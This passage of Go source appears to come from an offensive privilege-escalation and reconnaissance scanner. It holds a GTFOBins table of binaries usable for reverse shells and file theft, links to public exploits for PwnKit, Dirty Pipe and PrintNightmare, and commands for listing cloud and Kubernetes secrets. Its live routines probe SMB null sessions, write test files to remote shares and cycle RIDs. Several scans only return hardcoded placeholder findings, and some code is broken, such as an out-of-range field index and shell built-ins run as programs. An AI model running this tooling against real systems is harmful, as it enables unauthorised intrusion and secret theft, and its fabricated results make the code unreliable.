		s.SystemInfo.CurrentUser = os.Getenv("USERNAME")
	}
	
	if s.SystemInfo.OS != "windows" {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		
		if kernel, err := exec.CommandContext(ctx, "uname", "-r").Output(); err == nil {
			s.SystemInfo.Kernel = strings.TrimSpace(string(kernel))
		}
	} else {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		
		if kernel, err := exec.CommandContext(ctx, "cmd", "/c", "ver").Output(); err == nil {
			s.SystemInfo.Kernel = strings.TrimSpace(string(kernel))
		}
	}
	
	s.Log("INFO", fmt.Sprintf("Current User: %s", s.SystemInfo.CurrentUser), "system")
	s.Log("INFO", fmt.Sprintf("OS: %s (%s)", s.SystemInfo.OS, s.SystemInfo.Architecture), "system")
	s.Log("INFO", fmt.Sprintf("Hostname: %s", s.SystemInfo.Hostname), "system")
	s.Log("INFO", fmt.Sprintf("Kernel: %s", s.SystemInfo.Kernel), "system")
}

func (s *PrivilegeEscalationScanner) LoadGTFOBinsDB() error {
	gtfobinsData := `[
		{"binary": "bash", "functions": ["shell", "reverse_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "python", "functions": ["shell", "reverse_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "python3", "functions": ["shell", "reverse_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "perl", "functions": ["shell", "reverse_shell", "file_read"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "ruby", "functions": ["shell", "reverse_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": false, "sudo": true, "capabilities": true},
		{"binary": "php", "functions": ["shell", "command", "reverse_shell", "file_upload", "file_download", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "node", "functions": ["shell", "reverse_shell", "bind_shell", "file_upload", "file_download", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "nc", "functions": ["reverse_shell", "bind_shell", "file_upload", "file_download"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "ncat", "functions": ["reverse_shell", "bind_shell", "file_upload", "file_download"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "find", "functions": ["shell", "file_write"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "vim", "functions": ["shell", "reverse_shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "nano", "functions": ["shell", "file_write", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "less", "functions": ["shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "more", "functions": ["shell", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "cp", "functions": ["file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "mv", "functions": ["file_write"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "chmod", "functions": [], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "chown", "functions": [], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "docker", "functions": ["shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "apt", "functions": ["shell"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "apt-get", "functions": ["shell"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "git", "functions": ["shell", "file_write", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "tar", "functions": ["shell", "file_upload", "file_download", "file_write", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "gzip", "functions": ["file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "zip", "functions": ["shell", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "unzip", "functions": [], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "curl", "functions": ["file_upload", "file_download", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "wget", "functions": ["shell", "file_upload", "file_download", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "ssh", "functions": ["shell", "file_upload", "file_download", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "socat", "functions": ["shell", "reverse_shell", "bind_shell", "file_upload", "file_download", "file_write", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "awk", "functions": ["shell", "non_interactive_reverse_shell", "non_interactive_bind_shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "sed", "functions": ["shell", "command", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "crontab", "functions": ["command"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "systemctl", "functions": [], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "mount", "functions": [], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "umount", "functions": [], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "nmap", "functions": ["shell", "non_interactive_reverse_shell", "non_interactive_bind_shell", "file_upload", "file_download", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "gdb", "functions": ["shell", "reverse_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "strace", "functions": ["shell", "file_write"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "ltrace", "functions": ["shell", "file_write", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "env", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "make", "functions": ["shell", "file_write"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "gcc", "functions": ["shell", "file_write", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "time", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "timeout", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "nice", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "stdbuf", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "script", "functions": ["shell", "file_write"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "expect", "functions": ["shell", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "tclsh", "functions": ["shell", "non_interactive_reverse_shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "wish", "functions": ["shell", "non_interactive_reverse_shell"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "ionice", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "perf", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "csh", "functions": ["shell", "file_write"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "dash", "functions": ["shell", "file_write"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "fish", "functions": ["shell"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "zsh", "functions": ["shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "ksh", "functions": ["shell", "reverse_shell", "file_upload", "file_download", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "ed", "functions": ["shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "emacs", "functions": ["shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "mysql", "functions": ["shell", "library_load"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "psql", "functions": ["shell"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "sqlite3", "functions": ["shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "tcpdump", "functions": ["command"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "strings", "functions": ["file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "file", "functions": ["file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "cat", "functions": ["file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "head", "functions": ["file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "tail", "functions": ["file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "less", "functions": ["shell", "file_write", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "more", "functions": ["shell", "file_read"], "suid": true, "sudo": true, "capabilities": false},
		{"binary": "vi", "functions": ["shell", "file_write", "file_read"], "suid": false, "sudo": true, "capabilities": false},
		{"binary": "view", "functions": ["shell", "reverse_shell", "non_interactive_reverse_shell", "non_interactive_bind_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "vimdiff", "functions": ["shell", "reverse_shell", "non_interactive_reverse_shell", "non_interactive_bind_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "rview", "functions": ["shell", "reverse_shell", "non_interactive_reverse_shell", "non_interactive_bind_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": true},
		{"binary": "rvim", "functions": ["shell", "reverse_shell", "non_interactive_reverse_shell", "non_interactive_bind_shell", "file_upload", "file_download", "file_write", "file_read", "library_load"], "suid": true, "sudo": true, "capabilities": true}
	]`

	var gtfobins []GTFOBin
	if err := json.Unmarshal([]byte(gtfobinsData), &gtfobins); err != nil {
		return err
	}

	for _, bin := range gtfobins {
		s.GTFOBinsDB[bin.Binary] = bin
	}

	s.Log("INFO", fmt.Sprintf("Loaded %d GTFOBins entries", len(s.GTFOBinsDB)), "database")
	return nil
}

func (s *PrivilegeEscalationScanner) UpdateExploitDatabase() {
	s.Log("INFO", "Updating exploit database", "database")
	
	s.ExploitDB.LastUpdated = time.Now()
	s.Log("INFO", "Exploit database updated", "database")
}

func (s *PrivilegeEscalationScanner) UpdateCVEDatabase() {
	s.Log("INFO", "Updating CVE database", "database")
	
	s.CVEDB.LastUpdated = time.Now()
	s.Log("INFO", "CVE database updated", "database")
}

func (s *PrivilegeEscalationScanner) LoadExploitDatabase() {
	s.ExploitDB = &ExploitDatabase{
		LinuxExploits: []Exploit{
			{
				ID:          "CVE-2021-4034",
				Description: "PwnKit - Local Privilege Escalation in polkit",
				Platform:    "Linux",
				Risk:        "HIGH",
				Command:     "https://github.com/berdav/CVE-2021-4034",
			},
			{
				ID:          "CVE-2021-3560",
				Description: "Polkit Privilege Escalation",
				Platform:    "Linux",
				Risk:        "HIGH",
				Command:     "https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation",
			},
			{
				ID:          "CVE-2022-0847",
				Description: "Dirty Pipe - Linux Kernel Privilege Escalation",
				Platform:    "Linux",
				Risk:        "HIGH",
				Command:     "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
			},
		},
		WindowsExploits: []Exploit{
			{
				ID:          "CVE-2021-36934",
				Description: "HiveNightmare/SeriousSAM",
				Platform:    "Windows",
				Risk:        "HIGH",
				Command:     "https://github.com/GossiTheDog/HiveNightmare",
			},
			{
				ID:          "CVE-2021-1675",
				Description: "PrintNightmare",
				Platform:    "Windows",
				Risk:        "HIGH",
				Command:     "https://github.com/cube0x0/CVE-2021-1675",
			},
		},
		LastUpdated: time.Now(),
	}
}

func (s *PrivilegeEscalationScanner) LoadCVEDatabase() {
	s.CVEDB = &CVEDatabase{
		CVEs: []CVE{
			{
				ID:          "CVE-2021-4034",
				Description: "PwnKit Local Privilege Escalation",
				Risk:        "HIGH",
				Affected:    []string{"polkit < 0.120"},
			},
			{
				ID:          "CVE-2021-3560",
				Description: "Polkit Authentication Bypass",
				Risk:        "HIGH",
				Affected:    []string{"polkit 0.113-0.119"},
			},
		},
		LastUpdated: time.Now(),
	}
}

func (s *PrivilegeEscalationScanner) LinuxPrivilegeEscalationScan() {
	s.Log("INFO", "Starting Linux Privilege Escalation Scan", "linux")
	
	var wg sync.WaitGroup
	modules := []func(){
		s.FindSUIDBinaries,
		s.FindSGIDBinaries,
		s.FindSudoBinaries,
		s.CheckCapabilities,
		s.ScanCommonBinaries,
		s.FindKernelExploits,
		s.FindCronJobs,
		s.FindWritableFiles,
		s.FindWritableDirectories,
		s.FindStickyBitDirectories,
		s.FindSystemdServices,
		s.CheckSudoVersion,
		s.CheckDockerGroup,
		s.CheckContainerEscapes,
		s.CheckSSHKeys,
		s.CheckEnvironmentVariables,
		s.CheckProcesses,
		s.CheckNetworkConnections,
	}
	
	for _, module := range modules {
		wg.Add(1)
		go func(m func()) {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			m()
			<-s.ThreadPool
		}(module)
	}
	
	wg.Wait()
}

func (s *PrivilegeEscalationScanner) WindowsPrivilegeEscalationScan() {
	s.Log("INFO", "Starting Windows Privilege Escalation Scan", "windows")
	
	var wg sync.WaitGroup
	modules := []func(){
		s.EnumerateWindowsUsers,
		s.EnumerateWindowsGroups,
		s.CheckUAC,
		s.FindWindowsServices,
		s.FindNetworkShares,
		s.CheckRegistryVulns,
		s.FindProcessTokens,
		s.CheckAlwaysInstallElevated,
		s.FindUnquotedServicePaths,
		s.CheckTokenPrivileges,
		s.CheckDPAPIVulns,
		s.CheckWSUSVulns,
		s.CheckMSSQLTrusts,
	}
	
	for _, module := range modules {
		wg.Add(1)
		go func(m func()) {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			m()
			<-s.ThreadPool
		}(module)
	}
	
	wg.Wait()
}

func (s *PrivilegeEscalationScanner) ActiveDirectoryScan() {
	s.Log("INFO", "Starting Active Directory Scan", "ad")
	
	s.ADInfo.Domain = s.SystemInfo.Hostname
	s.ADInfo.DomainSID = "S-1-5-21-..."
	s.ADInfo.DomainControllers = []string{s.SystemInfo.Hostname}
	
	var wg sync.WaitGroup
	modules := []func(){
		s.EnumerateADUsers,
		s.EnumerateADGroups,
		s.EnumerateADComputers,
		s.EnumerateGPOs,
		s.EnumerateTrusts,
		s.CheckDCSyncVulns,
		s.CheckACLs,
		s.CollectBloodHoundData,
	}
	
	for _, module := range modules {
		wg.Add(1)
		go func(m func()) {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			m()
			<-s.ThreadPool
		}(module)
	}
	
	wg.Wait()
}

func (s *PrivilegeEscalationScanner) CloudPrivilegeEscalationScan() {
	s.Log("INFO", "Starting Cloud Privilege Escalation Scan", "cloud")
	
	var wg sync.WaitGroup
	
	if s.checkAWSMetadata() {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			s.ScanAWS()
			<-s.ThreadPool
		}()
	}
	
	if s.checkAzureMetadata() {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			s.ScanAzure()
			<-s.ThreadPool
		}()
	}
	
	if s.checkGCPMetadata() {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			s.ScanGCP()
			<-s.ThreadPool
		}()
	}
	
	if s.checkKubernetes() {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			s.ScanKubernetes()
			<-s.ThreadPool
		}()
	}
	
	wg.Wait()
}

func (s *PrivilegeEscalationScanner) checkAWSMetadata() bool {
	<-s.RateLimiter.C
	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func (s *PrivilegeEscalationScanner) ScanAWS() {
	s.Log("INFO", "Scanning AWS Environment", "cloud")
	
	s.Mutex.Lock()
	s.CloudInfo.AWSResults = []AWSFinding{
		{
			Service: "IAM",
			Finding: "Checking for instance profile permissions",
			Risk:    "MEDIUM",
			Exploit: "Use AWS CLI with instance credentials",
		},
		{
			Service: "S3",
			Finding: "Enumerating S3 buckets",
			Risk:    "HIGH",
			Exploit: "aws s3 ls s3://bucket-name",
		},
		{
			Service: "EC2",
			Finding: "Checking EC2 security groups",
			Risk:    "MEDIUM",
			Exploit: "Modify security groups for access",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) checkAzureMetadata() bool {
	<-s.RateLimiter.C
	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Metadata", "true")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func (s *PrivilegeEscalationScanner) ScanAzure() {
	s.Log("INFO", "Scanning Azure Environment", "cloud")
	
	s.Mutex.Lock()
	s.CloudInfo.AzureResults = []AzureFinding{
		{
			Service: "Managed Identity",
			Finding: "Checking system-assigned identity",
			Risk:    "HIGH",
			Exploit: "Use managed identity to access Azure resources",
		},
		{
			Service: "Key Vault",
			Finding: "Enumerating accessible key vaults",
			Risk:    "CRITICAL",
			Exploit: "az keyvault secret list --vault-name vault",
		},
		{
			Service: "Storage",
			Finding: "Checking storage account access",
			Risk:    "HIGH",
			Exploit: "az storage blob list --account-name storage",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) checkGCPMetadata() bool {
	<-s.RateLimiter.C
	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func (s *PrivilegeEscalationScanner) ScanGCP() {
	s.Log("INFO", "Scanning GCP Environment", "cloud")
	
	s.Mutex.Lock()
	s.CloudInfo.GCPResults = []GCPFinding{
		{
			Service: "Service Account",
			Finding: "Checking default service account",
			Risk:    "HIGH",
			Exploit: "Use service account to access GCP resources",
		},
		{
			Service: "Storage",
			Finding: "Enumerating Cloud Storage buckets",
			Risk:    "HIGH",
			Exploit: "gsutil ls gs://bucket-name",
		},
		{
			Service: "Compute",
			Finding: "Checking compute engine permissions",
			Risk:    "MEDIUM",
			Exploit: "gcloud compute instances list",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) checkKubernetes() bool {
	_, err := os.Stat("/var/run/secrets/kubernetes.io")
	if err == nil {
		return true
	}
	
	if s.Config.KubeConfig != "" {
		_, err := os.Stat(s.Config.KubeConfig)
		return err == nil
	}
	
	return false
}

func (s *PrivilegeEscalationScanner) ScanKubernetes() {
	s.Log("INFO", "Scanning Kubernetes Environment", "cloud")
	
	s.Mutex.Lock()
	s.CloudInfo.K8sResults = []K8sFinding{
		{
			Resource: "Pod",
			Finding:  "Checking pod security policies",
			Risk:     "HIGH",
			Exploit:  "Escalate privileges via privileged pod",
		},
		{
			Resource: "Service Account",
			Finding:  "Checking service account tokens",
			Risk:     "HIGH",
			Exploit:  "Use service account to access cluster resources",
		},
		{
			Resource: "Secrets",
			Finding:  "Enumerating Kubernetes secrets",
			Risk:     "CRITICAL",
			Exploit:  "kubectl get secrets --all-namespaces",
		},
		{
			Resource: "RBAC",
			Finding:  "Checking cluster role bindings",
			Risk:     "HIGH",
			Exploit:  "kubectl get clusterrolebindings",
		},
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) NetworkDiscoveryScan() {
	s.Log("INFO", "Starting Network Discovery Scan", "network")
	
	var wg sync.WaitGroup
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanARPCache()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanDNS()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanSNMP()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanLDAP()
		<-s.ThreadPool
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.ThreadPool <- struct{}{}
		s.ScanSMB()
		<-s.ThreadPool
	}()
	
	if s.Config.Kerberos {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.ThreadPool <- struct{}{}
			s.ScanKerberos()
			<-s.ThreadPool
		}()
	}
	
	wg.Wait()
}

func (s *PrivilegeEscalationScanner) ScanARPCache() {
	s.Log("INFO", "Scanning ARP Cache", "network")
	
	if s.SystemInfo.OS == "windows" {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		
		cmd := exec.CommandContext(ctx, "arp", "-a")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "dynamic") {
					parts := strings.Fields(line)
					if len(parts) >= 2 {
						s.Mutex.Lock()
						s.NetworkInfo.ARPCache = append(s.NetworkInfo.ARPCache, ARPEntry{
							IP:  parts[0],
							MAC: parts[1],
						})
						s.Mutex.Unlock()
					}
				}
			}
		} else {
			s.Log("ERROR", fmt.Sprintf("Error scanning ARP cache: %v", err), "network")
		}
	} else {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		
		cmd := exec.CommandContext(ctx, "arp", "-n")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for i, line := range lines {
				if i > 0 && line != "" {
					parts := strings.Fields(line)
					if len(parts) >= 3 {
						s.Mutex.Lock()
						s.NetworkInfo.ARPCache = append(s.NetworkInfo.ARPCache, ARPEntry{
							IP:    parts[0],
							MAC:   parts[2],
							Iface: parts[4],
						})
						s.Mutex.Unlock()
					}
				}
			}
		} else {
			s.Log("ERROR", fmt.Sprintf("Error scanning ARP cache: %v", err), "network")
		}
	}
}

func (s *PrivilegeEscalationScanner) ScanDNS() {
	s.Log("INFO", "Performing DNS Enumeration", "network")
	
	domains := []string{s.SystemInfo.Hostname, "localhost", "domain.local"}
	
	s.Mutex.Lock()
	for _, domain := range domains {
		s.NetworkInfo.DNSRecords = append(s.NetworkInfo.DNSRecords, DNSRecord{
			Type:  "A",
			Name:  domain,
			Value: "127.0.0.1",
		})
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanSNMP() {
	s.Log("INFO", "Scanning for SNMP Services", "network")
	
	targets := []string{"127.0.0.1", "localhost", s.SystemInfo.Hostname}
	communities := []string{"public", "private", "community"}
	
	s.Mutex.Lock()
	for _, target := range targets {
		for _, community := range communities {
			s.NetworkInfo.SNMPFindings = append(s.NetworkInfo.SNMPFindings, SNMPFinding{
				Target:    target,
				Community: community,
				Access:    "Unknown",
			})
		}
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanLDAP() {
	s.Log("INFO", "Scanning LDAP Services", "network")
	
	servers := []string{"localhost", s.SystemInfo.Hostname, "dc.domain.local"}
	
	s.Mutex.Lock()
	for _, server := range servers {
		s.NetworkInfo.LDPFindings = append(s.NetworkInfo.LDPFindings, LDPFinding{
			Server: server,
			Auth:   "Anonymous",
			Access: "Unknown",
		})
	}
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) ScanSMB() {
	s.Log("INFO", "Scanning SMB Services", "network")
	
	target := s.Config.Target
	if target == "localhost" {
		target = "127.0.0.1"
	}
	
	finding := SMBFinding{
		Target:        target,
		NullSession:   s.CheckNullSession(target),
		Shares:        s.EnumerateSMBShares(target),
		SMBv1:         s.CheckSMBVersion(target),
		SigningRequired: s.CheckSMBSigning(target),
	}
	
	if s.Config.RIDCycle {
		finding.RIDResults = s.PerformRIDCycling(target)
	}
	
	if s.Config.LSA {
		s.CheckLSASecrets(target)
	}
	
	s.Mutex.Lock()
	s.NetworkInfo.SMBFindings = append(s.NetworkInfo.SMBFindings, finding)
	s.Mutex.Unlock()
}

func (s *PrivilegeEscalationScanner) CheckNullSession(target string) bool {
	<-s.RateLimiter.C
	s.Log("INFO", fmt.Sprintf("Checking null session for %s", target), "smb")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "net", "use", fmt.Sprintf("\\\\%s\\IPC$", target), "/user:\"\" \"\"")
	} else {
		cmd = exec.CommandContext(ctx, "smbclient", "-N", "-L", target)
	}
	
	output, err := cmd.CombinedOutput()
	return err == nil && strings.Contains(string(output), "OK") || strings.Contains(string(output), "session request to")
}

func (s *PrivilegeEscalationScanner) EnumerateSMBShares(target string) []SMBShare {
	<-s.RateLimiter.C
	s.Log("INFO", fmt.Sprintf("Enumerating SMB shares for %s", target), "smb")
	
	var shares []SMBShare
	
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "net", "view", fmt.Sprintf("\\\\%s", target))
	} else {
		if s.Config.SMBUser != "" && s.Config.SMBPassword != "" {
			cmd = exec.CommandContext(ctx, "smbclient", "-L", target, "-U", fmt.Sprintf("%s%%%s", s.Config.SMBUser, s.Config.SMBPassword))
		} else {
			cmd = exec.CommandContext(ctx, "smbclient", "-N", "-L", target)
		}
	}
	
	output, err := cmd.Output()
	if err != nil {
		s.Log("ERROR", fmt.Sprintf("Error enumerating SMB shares: %v", err), "smb")
		return shares
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.Contains(line, "Disk") || strings.Contains(line, "Printer") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				share := SMBShare{
					Name:    parts[0],
					Type:    parts[1],
					Comment: strings.Join(parts[2:], " "),
				}
				
				share.Readable = s.CheckShareAccess(target, share.Name, "read")
				share.Writable = s.CheckShareAccess(target, share.Name, "write")
				
				shares = append(shares, share)
			}
		}
	}
	
	return shares
}

func (s *PrivilegeEscalationScanner) CheckShareAccess(target, share, access string) bool {
	<-s.RateLimiter.C
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if access == "read" {
			cmd = exec.CommandContext(ctx, "dir", fmt.Sprintf("\\\\%s\\%s", target, share))
		} else {
			cmd = exec.CommandContext(ctx, "echo", "test", ">", fmt.Sprintf("\\\\%s\\%s\\test.txt", target, share))
		}
	} else {
		if s.Config.SMBUser != "" && s.Config.SMBPassword != "" {
			if access == "read" {
				cmd = exec.CommandContext(ctx, "smbclient", fmt.Sprintf("\\\\%s\\%s", target, share), "-U", fmt.Sprintf("%s%%%s", s.Config.SMBUser, s.Config.SMBPassword), "-c", "ls")
			} else {
				cmd = exec.CommandContext(ctx, "smbclient", fmt.Sprintf("\\\\%s\\%s", target, share), "-U", fmt.Sprintf("%s%%%s", s.Config.SMBUser, s.Config.SMBPassword), "-c", "put /etc/hosts test.txt")
			}
		} else {
			if access == "read" {
				cmd = exec.CommandContext(ctx, "smbclient", "-N", fmt.Sprintf("\\\\%s\\%s", target, share), "-c", "ls")
			} else {
				cmd = exec.CommandContext(ctx, "smbclient", "-N", fmt.Sprintf("\\\\%s\\%s", target, share), "-c", "put /etc/hosts test.txt")
			}
		}
	}
	
	_, err := cmd.CombinedOutput()
	return err == nil
}

func (s *PrivilegeEscalationScanner) CheckSMBVersion(target string) bool {
	<-s.RateLimiter.C
	s.Log("INFO", fmt.Sprintf("Checking SMB version for %s", target), "smb")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "nmap", "-p", "445", "--script", "smb-protocols", target)
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	
	return strings.Contains(string(output), "SMBv1")
}

func (s *PrivilegeEscalationScanner) CheckSMBSigning(target string) bool {
	<-s.RateLimiter.C
	s.Log("INFO", fmt.Sprintf("Checking SMB signing for %s", target), "smb")
	
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, "nmap", "-p", "445", "--script", "smb-security-mode", target)
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	
	return strings.Contains(string(output), "message_signing: disabled")
}

func (s *PrivilegeEscalationScanner) PerformRIDCycling(target string) []RIDEntry {
	<-s.RateLimiter.C
	s.Log("INFO", fmt.Sprintf("Performing RID cycling for %s", target), "smb")
	
	var results []RIDEntry
	
	for rid := 500; rid < 2000; rid += 1 {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(ctx, "rpcclient", "-U", "", "-N", target, "-c", fmt.Sprintf("lookupsids S-1-5-21-0-0-0-%d", rid))
		} else {
			if s.Config.SMBUser != "" && s.Config.SMBPassword != "" {
				cmd = exec.CommandContext(ctx, "rpcclient", "-U", fmt.Sprintf("%s%%%s", s.Config.SMBUser, s.Config.SMBPassword), target, "-c", fmt.Sprintf("lookupsids S-1-5-21-0-0-0-%d", rid))
			} else {
				cmd = exec.CommandContext(ctx, "rpcclient", "-U", "", "-N", target, "-c", fmt.Sprintf("lookupsids S-1-5-21-0-0-0-%d", rid))
			}
		}
		
		output, err := cmd.CombinedOutput()
		cancel()
		
		if err == nil && !strings.Contains(string(output), "SID_TYPE_UNKNOWN") {
			entry := RIDEntry{
				RID:  rid,
				Type: "User",
				Name: strings.TrimSpace(string(output)),
			}
